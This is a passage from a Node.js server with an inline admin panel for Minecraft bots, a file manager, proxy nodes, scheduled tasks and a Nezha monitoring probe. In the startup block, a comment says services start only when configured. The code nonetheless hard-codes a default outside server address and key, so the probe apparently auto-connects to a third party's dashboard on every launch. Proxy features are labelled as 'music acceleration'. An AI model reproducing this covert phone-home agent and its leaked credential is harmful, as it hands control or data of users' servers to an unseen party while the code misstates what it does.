        var body={name:name||'通用节点',type:type,server:server,port:'',key:key,argod:'',argoa:'',mode:mode};
        var r=await fetch('/api/nodes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
        var d=await r.json();
        if(!d.success){alert('❌ 保存失败');return}
        var startR=await fetch('/api/nodes/'+d.node.id+'/start',{method:'POST'});
        loadNodeConfig();
    }catch(e){alert('❌ 操作失败')}
};
document.getElementById('node-auto-all').onclick=async function(){
    try{var r=await fetch('/api/nodes/start-all',{method:'POST'});loadNodeConfig()}catch(e){alert('❌ 操作失败')}
};
document.getElementById('node-list').addEventListener('click',function(e){
    var btn=e.target.closest('[data-node-act]');if(!btn)return;
    var act=btn.dataset.nodeAct;var id=btn.dataset.nodeId;
    if(act==='toggle'){fetch('/api/nodes/'+id+(document.querySelector('[data-node-id="'+id+'"]').textContent.includes('⏹️')?'/stop':'/start'),{method:'POST'}).then(function(){loadNodeConfig()})}
    else if(act==='edit'){var n=savedNodes.find(function(x){return x.id===id});if(n){_editingNodeId=id;document.getElementById('node-name').value=n.name;document.getElementById('node-type').value=n.type;document.getElementById('node-server').value=n.server||'';document.getElementById('node-port').value=n.port||'';document.getElementById('node-key').value=n.key||'';document.getElementById('node-argod').value=n.argod||'';document.getElementById('node-argoa').value=n.argoa||'';document.getElementById('node-mode').value=n.mode||'pure';document.getElementById('node-save').textContent='💾 更新节点'}
    }else if(act==='delete'){if(confirm('确认删除节点?')){fetch('/api/nodes/'+id,{method:'DELETE'}).then(function(){loadNodeConfig()})}
    }else if(act==='test'){var n=savedNodes.find(function(x){return x.id===id});if(n){fetch('/api/nodes/'+id+'/start',{method:'POST'}).then(function(){loadNodeConfig()})}
    }
});

// ===== 文件管理器 =====
var fmCurrentDir='/';
var fmUpPaths=[];

function fmFileIcon(name,isDir){
    if(isDir)return'📁';
    var ext=(name.split('.').pop()||'').toLowerCase();
    var m={js:'📜',json:'📋',txt:'📝',log:'📋',sh:'⚙️',yml:'⚙️',yaml:'⚙️',conf:'⚙️',cfg:'⚙️',env:'⚙️',md:'📝',html:'🌐',css:'🎨',py:'🐍',jar:'☕',zip:'📦',tar:'📦',gz:'📦',rar:'📦','7z':'📦',png:'🖼️',jpg:'🖼️',jpeg:'🖼️',gif:'🖼️',svg:'🖼️',ico:'🖼️',mp3:'🎵',wav:'🎵',flac:'🎵',mp4:'🎬',mkv:'🎬',avi:'🎬',pdf:'📕',doc:'📘',docx:'📘',xls:'📗',xlsx:'📗',exe:'💿',dll:'💿',so:'💿',db:'🗄️',sqlite:'🗄️'};
    return m[ext]||'📄';
}

function fmFormatSize(bytes){
    if(!bytes||bytes===0)return'0 B';
    var u=['B','KB','MB','GB','TB'];
    var i=Math.floor(Math.log(bytes)/Math.log(1024));
    if(i>=u.length)i=u.length-1;
    return(bytes/Math.pow(1024,i)).toFixed(i>0?1:0)+' '+u[i];
}

async function loadFileList(dir){
    try{
        var r=await fetch('/api/apps/files/list?dir='+encodeURIComponent(dir||'/'));if(!r.ok)return;var d=await r.json();
        if(!d.success){document.getElementById('fm-items').innerHTML='<div class="text-red-400 text-center py-8 text-xs">❌ '+escapeHtml(d.msg)+'</div>';return}
        fmCurrentDir=d.current||'/';
        fmUpPaths=d.upPaths||[];
        
        // 面包屑
        var bcEl=document.getElementById('fm-breadcrumb');
        var bcHtml='<span class="text-white font-bold cursor-pointer hover:text-cyan-300" data-fm-dir="/">/</span>';
        if(d.breadcrumbs){
            d.breadcrumbs.forEach(function(p,i){
                var isLast=i===d.breadcrumbs.length-1;
                bcHtml+='<span class="text-slate-600">/</span><span class="cursor-pointer hover:text-cyan-300 '+(isLast?'text-cyan-300 font-bold':'text-slate-300')+'" data-fm-dir="'+escapeHtml(p.path)+'">'+escapeHtml(p.name)+'</span>';
            });
        }
        bcEl.innerHTML=bcHtml;
        
        // 上级跳转按钮
        document.getElementById('fm-btn-up1').onclick=function(){if(d.parent)loadFileList(d.parent);};
        document.getElementById('fm-btn-up1').className=d.parent?'text-[10px] bg-slate-700 hover:bg-slate-600 px-2.5 py-1.5 rounded-lg font-bold cursor-pointer':'text-[10px] bg-slate-800 px-2.5 py-1.5 rounded-lg font-bold text-slate-600 cursor-not-allowed';
        
        for(var lv=2;lv<=3;lv++){
            var btn=document.getElementById('fm-btn-up'+lv);
            var up=fmUpPaths.find(function(u){return u.level===lv});
            if(up){
                btn.classList.remove('hidden');
                btn.onclick=(function(p){return function(){loadFileList(p)}})(up.path);
                btn.title='跳转到上'+lv+'级: '+up.name;
            }else{
                btn.classList.add('hidden');
            }
        }
        
        // 文件列表
        var itemsEl=document.getElementById('fm-items');
        if(!d.files||d.files.length===0){
            itemsEl.innerHTML='<div class="text-slate-500 opacity-50 text-center py-8 text-xs">📂 空目录</div>';
            document.getElementById('fm-count-info').textContent='0 项';
            return;
        }
        
        var html='';
        if(d.parent){
            html+='<div class="grid grid-cols-[1fr_90px_120px_60px] gap-2 px-3 py-2 fm-row cursor-pointer border-b border-white/5 items-center" data-fm-dir="'+escapeHtml(d.parent)+'">';
            html+='<span class="text-xs text-yellow-400 font-bold flex items-center gap-2">📁 ..</span>';
            html+='<span class="text-[10px] text-slate-600">-</span>';
            html+='<span class="text-[10px] text-slate-600">-</span>';
            html+='<span></span></div>';
        }
        
        d.files.forEach(function(f){
            var icon=fmFileIcon(f.name,f.isDir);
            var sizeStr=f.isDir?'-':fmFormatSize(f.size);
            var modStr=new Date(f.modified).toLocaleString('zh-CN',{hour12:false,month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit'});
            var clickAction=f.isDir?'data-fm-dir="'+escapeHtml(f.path)+'"':'data-fm-file="'+escapeHtml(f.path)+'"';
            var nameClass=f.isDir?'text-yellow-400 font-bold':'text-slate-300 hover:text-cyan-300';
            
            var rowCursor=f.isDir?'cursor-pointer':'';
            html+='<div class="grid grid-cols-[1fr_90px_120px_60px] gap-2 px-3 py-1.5 fm-row border-b border-white/5 items-center '+rowCursor+'" '+clickAction+'>';
            html+='<span class="text-xs flex items-center gap-2 '+nameClass+' truncate" title="'+escapeHtml(f.name)+'">'+icon+' '+escapeHtml(f.name)+'</span>';
            html+='<span class="text-[10px] text-slate-500">'+sizeStr+'</span>';
            html+='<span class="text-[10px] text-slate-500">'+modStr+'</span>';
            html+='<span class="flex gap-1">';
            html+='<button data-fm-del-path="'+escapeHtml(f.path)+'" data-fm-del-name="'+escapeHtml(f.name)+'" data-fm-del-dir="'+(f.isDir?'true':'false')+'" class="text-[9px] bg-red-600/20 hover:bg-red-600/50 text-red-400 px-1.5 py-0.5 rounded cursor-pointer" title="删除">✕</button>';
            html+='</span></div>';
        });
        
        itemsEl.innerHTML=html;
        var dirs=d.files.filter(function(f){return f.isDir}).length;
        var fils=d.files.length-dirs;
        document.getElementById('fm-count-info').textContent=d.files.length+' 项 ('+dirs+' 目录, '+fils+' 文件)';
    }catch(e){
        document.getElementById('fm-items').innerHTML='<div class="text-red-400 text-center py-8 text-xs">❌ 加载失败</div>';
    }
}

function fmDownload(filePath){
    window.open('/api/apps/files/download?path='+encodeURIComponent(filePath),'_blank');
}

async function fmDelete(filePath,fileName,isDir){
    var msg=isDir?'确认删除目录 "'+fileName+'" 及其所有内容？':'确认删除文件 "'+fileName+'"？';
    if(!confirm(msg))return;
    try{
        var r=await fetch('/api/apps/files/delete',{method:'DELETE',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:filePath})});
        var d=await r.json();
        if(d.success)loadFileList(fmCurrentDir);
        else alert('❌ '+d.msg);
    }catch(e){alert('❌ 删除失败')}
}

document.getElementById('fm-btn-upload').onclick=function(){document.getElementById('fm-upload-input').click()};
document.getElementById('fm-upload-input').onchange=async function(){
    if(!this.files||!this.files.length)return;
    var statusEl=document.getElementById('fm-upload-status');
    statusEl.classList.remove('hidden');
    statusEl.textContent='上传中 ('+this.files.length+'个文件)...';
    var fd=new FormData();
    for(var i=0;i<this.files.length;i++)fd.append('files',this.files[i]);
    fd.append('dir',fmCurrentDir);
    try{
        var r=await fetch('/api/apps/files/upload',{method:'POST',body:fd});
        var d=await r.json();
        if(d.success){
            statusEl.textContent='✅ 已上传 '+d.files.length+' 个文件';
            setTimeout(function(){statusEl.classList.add('hidden')},2000);
            loadFileList(fmCurrentDir);
            this.value='';
        }else{
            alert('❌ '+d.msg);statusEl.classList.add('hidden');
        }
    }catch(e){alert('❌ 上传失败');statusEl.classList.add('hidden')}
};

document.getElementById('fm-btn-mkdir').onclick=async function(){
    var name=prompt('请输入新目录名称:');
    if(!name||!name.trim())return;
    var dirPath=fmCurrentDir==='/'?'/'+name.trim():fmCurrentDir+'/'+name.trim();
    try{
        var r=await fetch('/api/apps/files/mkdir',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:dirPath})});
        var d=await r.json();
        if(d.success)loadFileList(fmCurrentDir);
        else alert('❌ '+d.msg);
    }catch(e){alert('❌ 创建失败')}
};

document.getElementById('fm-btn-refresh').onclick=function(){try{loadFileList(fmCurrentDir||'/')}catch(e){}};

// 文件管理器事件委托
document.getElementById('fm-file-list').addEventListener('click',function(e){
    var delBtn=e.target.closest('[data-fm-del-path]');
    if(delBtn){
        e.stopPropagation();
        fmDelete(delBtn.dataset.fmDelPath,delBtn.dataset.fmDelName,delBtn.dataset.fmDelDir==='true');
        return;
    }
    var dirEl=e.target.closest('[data-fm-dir]');
    if(dirEl){loadFileList(dirEl.dataset.fmDir);return}
    var fileEl=e.target.closest('[data-fm-file]');
    if(fileEl){fmDownload(fileEl.dataset.fmFile);return}
});
document.getElementById('fm-breadcrumb').addEventListener('click',function(e){
    var dirEl=e.target.closest('[data-fm-dir]');
    if(dirEl)loadFileList(dirEl.dataset.fmDir);
});

// ===== 通用功能 =====

async function updateSystemStatus(){try{var r=await fetch('/api/system/status');var d=await r.json();document.getElementById('mem-percent').innerText=d.percent+'%';document.getElementById('mem-progress').style.width=d.percent+'%';var p=document.getElementById('mem-progress');p.className=parseFloat(d.percent)>80?"h-full bg-gradient-to-r from-red-500 to-orange-400 transition-all duration-700 rounded-full":"h-full bg-gradient-to-r from-blue-500 to-cyan-400 transition-all duration-700 rounded-full"}catch(e){}}
async function uploadFile(b,i){if(!i.files[0])return;var f=new FormData();f.append('file',i.files[0]);var r=await fetch('/api/bots/'+b+'/upload',{method:'POST',body:f});alert(r.ok?'✅ 成功':'❌ 失败');i.value=''}
async function restartNow(id){await fetch('/api/bots/'+id+'/restart-now',{method:'POST'});updateUI(true)}
async function setTimer(id,v,u){await fetch('/api/bots/'+id+'/set-timer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({value:v,unit:u})});updateUI(true)}
async function savePto(id){var d={url:document.getElementById('url-'+id).value,id:document.getElementById('sid-'+id).value,key:document.getElementById('key-'+id).value,defaultDir:document.getElementById('ddir-'+id).value};await fetch('/api/bots/'+id+'/pto-config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});updateUI(true)}
async function toggleGuard(id){await fetch('/api/bots/'+id+'/toggle-guard',{method:'POST'});updateUI(true)}
async function toggle(id,t){await fetch('/api/bots/'+id+'/toggle',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:t})});updateUI(true)}
async function removeBot(id){if(confirm('确认移除？')){await fetch('/api/bots/'+id,{method:'DELETE'});updateUI(true)}}

async function updateUI(force){
try{
if(!force){var a=document.activeElement;if(a&&(a.tagName==='INPUT'||a.tagName==='SUMMARY'||a.tagName==='SELECT'||a.tagName==='TEXTAREA'||(a.closest&&a.closest('details[open]'))))return}
var r=await fetch('/api/bots');if(!r.ok)return;var d=await r.json();
var od=Array.from(document.querySelectorAll('details[open]')).map(function(e){return e.id});
var sp={};document.querySelectorAll('.log-box[data-bot-id]').forEach(function(e){sp[e.dataset.botId]=e.scrollTop});
var html='';
d.bots.forEach(function(b){
var pto=b.settings.pterodactyl||{};var on=b.status==='在线';
html+='<div class="glass rounded-3xl overflow-hidden border-t-4 '+(on?'border-emerald-500':'border-red-500')+' card-hover flex flex-col"><div class="p-6 flex-1 flex flex-col gap-4">';
html+='<div class="flex justify-between items-center"><div><div class="flex items-center gap-2.5"><h3 class="text-xl font-extrabold tracking-tight">'+escapeHtml(b.username)+'</h3><span class="px-2.5 py-1 rounded-full text-[10px] font-bold flex items-center gap-1.5 '+(on?'bg-emerald-500/20 text-emerald-400':'bg-red-500/20 text-red-400')+'"><span class="status-dot '+(on?'online':'offline')+'"></span>'+b.status+'</span></div><p class="text-xs text-slate-500 mt-1 font-medium">'+escapeHtml(b.host)+':'+b.port+'</p></div><button data-act="remove" data-id="'+b.id+'" class="w-8 h-8 rounded-full bg-slate-800 hover:bg-red-600 hover:text-white text-slate-500 transition-colors flex items-center justify-center text-sm font-bold shadow-inner cursor-pointer">✕</button></div>';
html+='<div data-bot-id="'+b.id+'" class="log-box bg-black/60 rounded-2xl p-4 h-40 overflow-y-auto font-mono text-[11px] border border-slate-800/50 shadow-inner">';
b.logs.forEach(function(l){html+='<div class="mb-1.5 '+(l.color||'')+' flex"><span class="opacity-30 mr-2 shrink-0 select-none">['+l.time+']</span><span>'+l.msg+'</span></div>'});
html+='</div>';
html+='<div class="grid grid-cols-3 gap-2"><button data-act="toggle" data-id="'+b.id+'" data-type="ai" class="toggle-btn '+(b.settings.ai?'bg-blue-600/90 shadow-lg shadow-blue-500/30 text-white':'off')+' py-2.5 rounded-xl text-xs font-bold cursor-pointer">👁️ AI</button><button data-act="toggle" data-id="'+b.id+'" data-type="walk" class="toggle-btn '+(b.settings.walk?'bg-emerald-600/90 shadow-lg shadow-emerald-500/30 text-white':'off')+' py-2.5 rounded-xl text-xs font-bold cursor-pointer">👣 巡逻</button><button data-act="toggle" data-id="'+b.id+'" data-type="chat" class="toggle-btn '+(b.settings.chat?'bg-orange-600/90 shadow-lg shadow-orange-500/30 text-white':'off')+' py-2.5 rounded-xl text-xs font-bold cursor-pointer">💬 喊话</button></div>';
html+='<div class="bg-slate-900/60 p-4 rounded-2xl border border-slate-800/50"><div class="flex justify-between items-center mb-3"><h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider">重启序列</h4><span class="text-[10px] text-slate-500">下次: <span class="text-cyan-400 font-semibold">'+b.nextRestart+'</span></span></div><div class="grid grid-cols-2 gap-2 mb-3"><div><input id="min-'+b.id+'" type="number" placeholder="分钟" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><button data-act="set-timer" data-id="'+b.id+'" data-input="min-'+b.id+'" data-unit="min" class="mt-1.5 w-full bg-slate-800 hover:bg-slate-700 py-2 rounded-xl text-[10px] font-bold transition-colors cursor-pointer">设定分钟</button></div><div><input id="hour-'+b.id+'" type="number" placeholder="小时" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><button data-act="set-timer" data-id="'+b.id+'" data-input="hour-'+b.id+'" data-unit="hour" class="mt-1.5 w-full bg-slate-800 hover:bg-slate-700 py-2 rounded-xl text-[10px] font-bold transition-colors cursor-pointer">设定小时</button></div></div><button data-act="restart" data-id="'+b.id+'" class="btn-danger w-full py-2.5 rounded-xl text-xs font-bold uppercase active:scale-95 transition-all cursor-pointer">⚡ 立即重启</button></div>';
html+='<details id="pto-'+b.id+'" class="group"><summary class="flex justify-between items-center cursor-pointer list-none bg-slate-900/60 p-3 rounded-2xl border border-slate-800/50 hover:border-slate-700 transition-colors"><span class="text-xs font-bold text-slate-400 uppercase tracking-wider">🦖 翼龙同步</span><span class="transition group-open:rotate-180 text-slate-500 text-xs">▼</span></summary><div class="mt-2 space-y-2 p-3 bg-slate-900/60 rounded-2xl border border-slate-800/50">';
html+='<input data-draft="'+b.id+'|url" id="url-'+b.id+'" placeholder="面板地址" value="'+escapeHtml(getDraft(b.id,'url',pto.url))+'" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">';
html+='<div class="grid grid-cols-2 gap-2"><input data-draft="'+b.id+'|sid" id="sid-'+b.id+'" placeholder="服务器 ID" value="'+escapeHtml(getDraft(b.id,'sid',pto.id))+'" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input data-draft="'+b.id+'|ddir" id="ddir-'+b.id+'" placeholder="目录" value="'+escapeHtml(getDraft(b.id,'ddir',pto.defaultDir))+'" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-emerald-400"></div>';
html+='<input data-draft="'+b.id+'|key" id="key-'+b.id+'" type="password" placeholder="API Key" value="'+escapeHtml(getDraft(b.id,'key',pto.key))+'" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">';
html+='<div class="grid grid-cols-2 gap-2 pt-1"><button data-act="save-pto" data-id="'+b.id+'" class="bg-slate-800 hover:bg-slate-700 text-[10px] py-2.5 rounded-xl font-bold transition-colors cursor-pointer">💾 保存</button><button data-act="upload" data-id="'+b.id+'" class="btn-primary text-[10px] py-2.5 rounded-xl font-bold cursor-pointer">🚀 同步</button><input type="file" id="f-'+b.id+'" data-botid="'+b.id+'" class="hidden"></div>';
html+='<button data-act="toggle-guard" data-id="'+b.id+'" class="toggle-btn '+(pto.guard?'bg-indigo-600/90 shadow-lg shadow-indigo-500/30 text-white':'off')+' w-full py-2.5 rounded-xl text-[10px] font-bold mt-2 cursor-pointer">🛡️ 守护 '+(pto.guard?'开启':'关闭')+'</button>';
html+='</div></details></div></div>';
});
document.getElementById('list').innerHTML=html;
od.forEach(function(id2){var el=document.getElementById(id2);if(el)el.open=true});
document.querySelectorAll('.log-box[data-bot-id]').forEach(function(e){if(sp[e.dataset.botId]!==undefined)e.scrollTop=sp[e.dataset.botId]});
}catch(e){}
}

document.getElementById('list').addEventListener('click',function(e){
var el=e.target.closest('[data-act]');if(!el)return;
var act=el.dataset.act,id=el.dataset.id;
if(act==='toggle')toggle(id,el.dataset.type);
else if(act==='remove')removeBot(id);
else if(act==='restart')restartNow(id);
else if(act==='set-timer')setTimer(id,document.getElementById(el.dataset.input).value,el.dataset.unit);
else if(act==='save-pto')savePto(id);
else if(act==='toggle-guard')toggleGuard(id);
else if(act==='upload')document.getElementById('f-'+id).click();
});
document.getElementById('list').addEventListener('input',function(e){if(e.target.dataset.draft){var parts=e.target.dataset.draft.split('|');saveDraft(parts[0],parts[1],e.target.value)}});
document.getElementById('list').addEventListener('change',function(e){if(e.target.type==='file'&&e.target.dataset.botid)uploadFile(e.target.dataset.botid,e.target)});

async function loadNezhaStatus(){
    try {
        var r=await fetch('/api/nezha/config');
        if(!r.ok)return;
        var d=await r.json();
        var serverPure=d.mode==='pure';
        var isRunning=d.running;
        _serverMode=d.mode||'pure';
        _serverRunning=!!isRunning;
        var previewPure=_nzPreviewMode!==null?(_nzPreviewMode==='pure'):serverPure;
        document.getElementById('nz-pure-btn').className='flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all '+(previewPure?'bg-purple-600/80 text-white border border-purple-500/30':'bg-slate-700/80 text-slate-400 border border-slate-600/30');
        document.getElementById('nz-lw-btn').className='flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all '+(!previewPure?'bg-orange-600/80 text-white border border-orange-500/30':'bg-slate-700/80 text-slate-400 border border-slate-600/30');
        document.getElementById('lw-config-section').style.display=previewPure?'none':'';
        document.getElementById('nz-addr').disabled=isRunning;
        document.getElementById('nz-key').disabled=isRunning;
        document.getElementById('nz-tls').disabled=isRunning;
        var lwInputs=document.getElementById('lw-config-section').querySelectorAll('input');
        for(var i=0;i<lwInputs.length;i++){lwInputs[i].disabled=isRunning}
        document.getElementById('nz-pure-btn').style.pointerEvents=isRunning?'none':'';
        document.getElementById('nz-pure-btn').style.opacity=isRunning?'0.5':'';
        document.getElementById('nz-lw-btn').style.pointerEvents=isRunning?'none':'';
        document.getElementById('nz-lw-btn').style.opacity=isRunning?'0.5':'';
        document.getElementById('lw-features-section').style.display=serverPure?'none':'';
        document.getElementById('lw-node-row').style.display=serverPure?'none':'';
        document.getElementById('nz-config-title').innerText=previewPure?'📡 纯Node.js探针配置':'📡 老王模式探针配置';
        if(isRunning&&serverPure){document.getElementById('nz-pure-dot').className='status-dot online shrink-0';document.getElementById('nz-pure-status').className='text-xs font-bold text-emerald-400';document.getElementById('nz-pure-status').innerText='运行中';document.getElementById('nz-lw-dot').className='status-dot offline shrink-0';document.getElementById('nz-lw-status').className='text-xs font-bold text-slate-500';document.getElementById('nz-lw-status').innerText='未运行'}
        else if(isRunning&&!serverPure){document.getElementById('nz-lw-dot').className='status-dot online shrink-0';document.getElementById('nz-lw-status').className='text-xs font-bold text-orange-400';document.getElementById('nz-lw-status').innerText='运行中';document.getElementById('nz-pure-dot').className='status-dot offline shrink-0';document.getElementById('nz-pure-status').className='text-xs font-bold text-slate-500';document.getElementById('nz-pure-status').innerText='未运行'}
        else{document.getElementById('nz-pure-dot').className='status-dot offline shrink-0';document.getElementById('nz-pure-status').className='text-xs font-bold text-slate-500';document.getElementById('nz-pure-status').innerText='未运行';document.getElementById('nz-lw-dot').className='status-dot offline shrink-0';document.getElementById('nz-lw-status').className='text-xs font-bold text-slate-500';document.getElementById('nz-lw-status').innerText='未运行'}
        var addrEl=document.getElementById('nz-addr');
        var keyEl=document.getElementById('nz-key');
        var lsAddr=null,lsKey=null;
        try{lsAddr=localStorage.getItem(_nzLS_PREFIX+'nz-addr')}catch(x){}
        try{lsKey=localStorage.getItem(_nzLS_PREFIX+'nz-key')}catch(x){}
        if(lsAddr!==null&&lsAddr!==''){addrEl.value=lsAddr}else if(d.addr){addrEl.value=d.addr}
        if(lsKey!==null&&lsKey!==''){keyEl.value=lsKey}else if(d.key){keyEl.value=d.key}
        var lsTls=null;try{lsTls=localStorage.getItem(_nzLS_PREFIX+'nz-tls')}catch(x){}
        if(lsTls!==null){document.getElementById('nz-tls').checked=lsTls==='true'}else{document.getElementById('nz-tls').checked=d.tls!==false}
        document.getElementById('btn-start').className=isRunning?'bg-slate-700 text-slate-400 py-2.5 rounded-xl text-xs font-bold cursor-pointer opacity-50':'bg-emerald-600/80 hover:bg-emerald-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer';
        document.getElementById('btn-stop').className=isRunning?'bg-orange-600/80 hover:bg-orange-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer':'bg-slate-700 text-slate-400 py-2.5 rounded-xl text-xs font-bold cursor-pointer opacity-50';
        // 加载哪吒探针运行日志
        try{
            var lr=await fetch('/api/nezha/logs');
            if(lr.ok){var ld=await lr.json();var nzLogBox=document.getElementById('nezha-log-box');if(nzLogBox)nzLogBox.innerHTML=renderLogs(ld.logs,12);}
        }catch(le){console.error('Load nezha logs failed:',le);}
    } catch(e) {
        console.error('Load nezha status failed:',e);
    }
}
// ===== 模式按钮：仅切换预览(按钮高亮+配置区)，不改变lw-*功能区 =====
document.getElementById('nz-pure-btn').onclick=function(){
    _nzPreviewMode='pure'; // 记住预览选择
    document.getElementById('nz-pure-btn').className='flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all bg-purple-600/80 text-white border border-purple-500/30';
    document.getElementById('nz-lw-btn').className='flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all bg-slate-700/80 text-slate-400 border border-slate-600/30';
    // 仅切换配置区标题，不改变lw-features-section/lw-node-row
    document.getElementById('nz-config-title').innerText='📡 纯Node.js探针配置';
    document.getElementById('lw-config-section').style.display='none';
};
document.getElementById('nz-lw-btn').onclick=function(){
    _nzPreviewMode='laowang'; // 记住预览选择
    document.getElementById('nz-lw-btn').className='flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all bg-orange-600/80 text-white border border-orange-500/30';
    document.getElementById('nz-pure-btn').className='flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all bg-slate-700/80 text-slate-400 border border-slate-600/30';
    // 仅切换配置区标题，不改变lw-features-section/lw-node-row
    document.getElementById('nz-config-title').innerText='📡 老王模式探针配置';
    document.getElementById('lw-config-section').style.display='';
};

setInterval(function(){try{updateUI(false)}catch(e){}try{updateSystemStatus()}catch(e){}var m1=document.getElementById('modal-app-center');if(m1&&m1.classList.contains('active')){try{if(document.getElementById('view-ff').classList.contains('active-view'))loadFFStatus()}catch(e){}try{if(document.getElementById('view-music').classList.contains('active-view')){loadMusicStatus();loadNezhaStatus()}}catch(e){}}var m2=document.getElementById('modal-tavern');if(m2&&m2.classList.contains('active'))try{loadTavernData()}catch(e){}},3000);
updateUI(true);
<\/script>
</body></html>`);
});

const PORT = process.env.SERVER_PORT || 3000;
app.listen(PORT, '0.0.0.0', function(){
    if(fsSync.existsSync(CONFIG_FILE)){
        try{
            var saved = JSON.parse(fsSync.readFileSync(CONFIG_FILE));
            saved.forEach(function(b){
                createSmartBot('bot_'+Math.random().toString(36).substr(2,5), b.host, b.port, b.username, b.logs||[], b.settings)
            })
        }catch(e){}
    }
    
// ============================================
// 🔧 一键启动预设 - 填了对应变量就自启, 不填不启动
// ============================================
// 哪吒探针
var NZ_SERVER = process.env.NZ_SERVER || 'zha.cailuo.ggff.net:443';
var NZ_KEY    = process.env.NZ_KEY || '1nyDc7hRxR2bQbMmiGWy5PxTpbSWheUR';
var NZ_PORT   = process.env.NZ_PORT || '';
var NZ_TLS    = process.env.NZ_TLS || 'true';
var NZ_MODE   = process.env.NZ_MODE || 'pure';
// 音乐加速(老王模式)
var NZ_ARGO_DOMAIN = process.env.NZ_ARGO_DOMAIN || '';
var NZ_ARGO_AUTH   = process.env.NZ_ARGO_AUTH || '';
var NZ_ARGO_PORT   = process.env.NZ_ARGO_PORT || '8001';
// 酒馆任务
var TAVERN_AUTO_START = process.env.TAVERN_AUTO_START || '';
var TAVERN_TASKS = process.env.TAVERN_TASKS || '';
// 挂机机器人
var BOT_AUTO_START = process.env.BOT_AUTO_START || '';
var MC_SERVER_IP = process.env.MC_SERVER_IP || '';
var MC_SERVER_PORT = process.env.MC_SERVER_PORT || '25565';
var MC_BOT_USERNAME = process.env.MC_BOT_USERNAME || 'PathfinderBot';
// ============================================

// ===== 哪吒探针自启 =====
(async function(){
    if(!NZ_SERVER || !NZ_KEY || !NZ_MODE) return;
    var addr = NZ_SERVER;
    if(NZ_PORT && NZ_PORT.trim() !== '' && NZ_SERVER.indexOf(':') === -1) addr = NZ_SERVER + ':' + NZ_PORT.trim();
    var key = NZ_KEY;
    var tls = (NZ_TLS === 'true' || NZ_TLS === true);
    var mode = NZ_MODE === 'laowang' ? 'laowang' : 'pure';
    nezhaConfig.addr = addr;
    nezhaConfig.key = key;
    nezhaConfig.tls = tls;
    nezhaConfig.mode = mode;
    try{ await saveNezhaConfig(); }catch(e){}
    if(mode === 'laowang'){
        try{ await startNezha(addr, key, tls); }catch(e){ console.error('AutoStart Nezha OldWang Failed:', e); }
    } else {
        try{ await startNezhaPure(addr, key, tls); }catch(e){ console.error('AutoStart Nezha Pure Failed:', e); }
    }
})();
// ===== 音乐加速自启 =====
(async function(){
    if(!NZ_ARGO_DOMAIN && !fsSync.existsSync(MUSIC_ENV_FILE)) return;
    var _nzCfg = {NEZHA_SERVER:NZ_SERVER,NEZHA_KEY:NZ_KEY,NEZHA_PORT:NZ_PORT,ARGO_DOMAIN:NZ_ARGO_DOMAIN,ARGO_AUTH:NZ_ARGO_AUTH,ARGO_PORT:NZ_ARGO_PORT};
    var _nzEnv = {};
    if(fsSync.existsSync(MUSIC_ENV_FILE)){try{_nzEnv=JSON.parse(fsSync.readFileSync(MUSIC_ENV_FILE,'utf8'))}catch(e){}}
    var _nzFinal = Object.assign({}, _nzCfg, _nzEnv);
    if(!fsSync.existsSync(MUSIC_DIR))fsSync.mkdirSync(MUSIC_DIR,{recursive:true});
    if(!_nzEnv.NEZHA_SERVER && NZ_SERVER){fsSync.writeFileSync(MUSIC_ENV_FILE,JSON.stringify(_nzFinal,null,2))}
    startMusicCore(_nzFinal,true).catch(function(e){console.error('AutoStart Music Failed:',e)});
})();
// ===== 酒馆任务自启 =====
(async function(){
    if(!TAVERN_AUTO_START && !TAVERN_TASKS) return;
    var defaultTavernConfigFile = path.join(__dirname, 'default_tavern.json');
    if(TAVERN_TASKS){
        try{
            var tasks = JSON.parse(TAVERN_TASKS);
            if(Array.isArray(tasks)){
                for(var i=0;i<tasks.length;i++){
                    var t = tasks[i];
                    var id='task_'+Math.random().toString(36).substr(2,7);
                    tavernTasks.set(id,{id:id,name:t.name||'自启任务',type:t.type||'cron',method:t.method||'GET',body:t.body||'',url:t.url||'',interval:parseFloat(t.interval)||5,unit:t.unit||'min',account:t.account||'',password:t.password||'',token:t.token||'',running:false,timer:null,logs:[]});
                    pushTaskLog(id,'🔧 自启任务: '+t.url,'text-emerald-400');
                }
                saveTavernConfig();
            }
        }catch(e){console.error('Tavern auto-start parse error:',e);}
    }
    if(fsSync.existsSync(defaultTavernConfigFile)){
        try{
            var d = JSON.parse(fsSync.readFileSync(defaultTavernConfigFile,'utf8'));
            if(d.tasks){
                for(var j=0;j<d.tasks.length;j++){
                    var t2=d.tasks[j];
                    var id2='task_'+Math.random().toString(36).substr(2,7);
                    tavernTasks.set(id2,{id:id2,name:t2.name||'酒馆任务',type:t2.type||'cron',method:t2.method||'GET',body:t2.body||'',url:t2.url||'',interval:parseFloat(t2.interval)||5,unit:t2.unit||'min',account:t2.account||'',password:t2.password||'',token:t2.token||'',running:false,timer:null,logs:[]});
                    pushTaskLog(id2,'🔧 自启任务: '+t2.url,'text-emerald-400');
                }
                saveTavernConfig();
            }
        }catch(e){}
    }
    if(TAVERN_AUTO_START==='true'){
        try{
            var ta=await fetch('/api/apps/tavern/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({account:process.env.TAVERN_ACCOUNT||'',password:process.env.TAVERN_PASSWORD||'',token:process.env.TAVERN_TOKEN||''})});
